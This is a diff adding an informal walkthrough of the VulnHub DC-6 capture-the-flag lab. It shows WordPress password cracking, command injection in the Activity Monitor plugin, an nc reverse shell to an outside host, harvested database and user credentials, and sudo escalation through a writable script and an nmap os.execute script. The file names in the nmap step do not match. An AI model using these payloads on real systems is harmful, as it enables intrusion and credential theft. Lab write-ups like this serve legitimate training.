@@ -1,0 +1,112 @@
+we have crack wordpress password in order to get inside
+
+Hint found From vulnhub # Thanks for that
+
+$passwords.txt = cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
+
+wpscan --url http://wordy -e u -P "$passwords.txt"
+
+creds: mark / helpdesk01
+
+***Lets log into wordpres***
+
+Inside Wordpress we got an intresting plugin Activity monitor that makes log
+
+activity_monitor
+
+At the tool section activity_monitor if we fill
+Ip or integer = 192.168.0.1; id
+and do lookup we got lookup awa id command output
+
+so we can get shell through it 
+bu modifing request with burp suite 192.168.0.1;/bin/nc 192.168.0.1 1457 -e /bin/sh
+
+I don't like my shell so I switch it with socat shell
+
+**********************After getting a stable shell with socat :-)********************
+My Fav part prev esc
+*************************************************************************************
+
+First thing first get the db cred from wp-config (Found inside /var/www/html)
+
+define( 'DB_NAME', 'wordpressdb' );
+
+define( 'DB_USER', 'wpdbuser' );
+
+define( 'DB_PASSWORD', 'meErKatZ' );
+
+----------------------------------------------------------------------------
+Now time for searching inside Home dirs
+
+=> I found a stuff folder (Inside /home/mark/)
+Mark is a naughty boy ;-p
+
+-----------------------------------------------------------------------------
+=> cat /home/mark/stuff/things-to-do.txt 
+Things to do:
+
+- Restore full functionality for the hyperdrive (need to speak to Jens)
+- Buy present for Sarah's farewell party
+- Add new user: graham - GSo7isUM1D4 - done
+- Apply for the OSCP course
+- Buy new laptop for Sarah's replacement
+
+-------------------------------------------------------------------------------
+=>there is a script inside /home/jens (jens home folder)
+cat /home/jens/backups.sh 
+
+#!/bin/bash
+tar -czf backups.tar.gz /var/www/html
+
+This script do a backup of /vat/www/html
+
+--------------------------------------------------------------------------------
+
+now It's time to switch as graham with passwords GSo7isUM1D4
+
+--------------------------------------------------------------------------------
+graham is a more naughtyer he can run jens backups.sh scrip as jenis
+	(jens) NOPASSWD: /home/jens/backups.sh
+
+	=>ls -la /home/jens/backups.sh
+	-rwxrwxr-x 1 jens devs 58 May 17 00:25 /home/jens/backups.sh
+
+	We can write anything inside backups.sh (Its like security with admin/admin :-)
+----------------------------------------------------------------------------------------
+lets append /bin/sh inside /home/jens/backups.sh
+That do the trick now we are jens
+----------------------------------------------------------------------------------------
+jens can execute nmap as root
+	(root) NOPASSWD: /usr/bin/nmap
+
+nmap have very known vuln of intractive mode which can be esaly esclate to shell
+but in our case we don't have this feature so we have to use coustome scrip way
+
+step 1 Create a coustom script
+echo 'os.execute("/bin/sh")' > CK
+
+step 2 run it
+sudo /usr/bin/nmap --script=scr
+
+now we have root shell 
+blablabl all done
+
+total time to root 58 miniuts approx
+
+root@dc-6:~# cat theflag.txt
+
+
+Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
+ Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
+  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
+   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 
+
+
+Congratulations!!!
+
+Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
+who have provided feedback, and who have taken time to complete these little
+challenges.
+
+If you enjoyed this CTF, send me a tweet via @DCAU7.
+
